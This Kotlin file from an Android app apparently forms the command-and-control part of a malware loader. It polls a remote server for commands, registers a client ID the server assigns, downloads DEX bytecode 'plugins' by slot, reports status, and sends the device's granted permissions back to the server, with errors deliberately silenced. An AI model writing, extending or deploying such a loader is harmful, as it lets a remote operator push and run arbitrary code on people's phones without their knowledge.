package com.nexrtz.loader

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object PluginApi {
    private var clientId: String? = null

    fun poll(): JSONObject? {
        try {
            val urlStr = "${Config.serverBase()}/api/v1/poll" +
                    if (clientId != null) "?client_id=$clientId" else ""

            val conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.connectTimeout = 10000
            conn.readTimeout = 40000

            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(body)
                val cmd = json.optString("command")

                if (cmd == "register") {
                    clientId = json.getString("client_id")
                    Log.d("PluginApi", "Registered with ID: $clientId")
                    return JSONObject().put("command", "register")
                }

                if (cmd != "idle") {
                    return json // Return the full JSON so CoreService can extract slot/permission
                }
            }
        } catch (e: Exception) {
            // Log.e("PluginApi", "Poll error", e) // Silenced to prevent log spam on disconnect
        }
        return null
    }

    fun getClientId(): String? = clientId

    fun fetchDex(slot: String): ByteArray {
        val conn = URL("${Config.serverBase()}/api/v1/get-plugin/$slot").openConnection() as HttpURLConnection
        conn.setRequestProperty("User-Agent", Config.UA)
        conn.connectTimeout = 10000
        if (conn.responseCode != 200) throw Exception("Failed to fetch dex")
        return conn.inputStream.readBytes()
    }

    fun ackStatus(slot: String, status: String) {
        try {
            val conn = URL("${Config.serverBase()}/api/v1/telemetry/$slot").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write("{\"status\": \"$status\"}".toByteArray())
            conn.responseCode
        } catch (_: Exception) {}
    }

    fun reportPermissions(permissions: List<String>) {
        val id = clientId ?: return
        try {
            val conn = URL("${Config.serverBase()}/api/v1/permissions/$id").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")

            val json = JSONObject()
            json.put("granted", JSONArray(permissions))

            conn.outputStream.write(json.toString().toByteArray())
            conn.responseCode
        } catch (_: Exception) {}
    }
}